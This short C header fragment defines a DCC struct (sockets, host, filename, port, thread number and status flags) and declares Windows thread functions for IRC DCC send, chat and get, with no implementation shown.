typedef struct DCC 
{
	SOCKET sock;
	SOCKET csock;
	char host[20];
	char filename[MAX_PATH];
	char sendto[128];
	int port;
	int threadnum;
	bool notice;
	bool silent;
	bool gotinfo;

} DCC;

DWORD WINAPI DCCSendThread(LPVOID param);
DWORD WINAPI DCCChatThread(LPVOID param);
DWORD WINAPI DCCGetThread(LPVOID param);
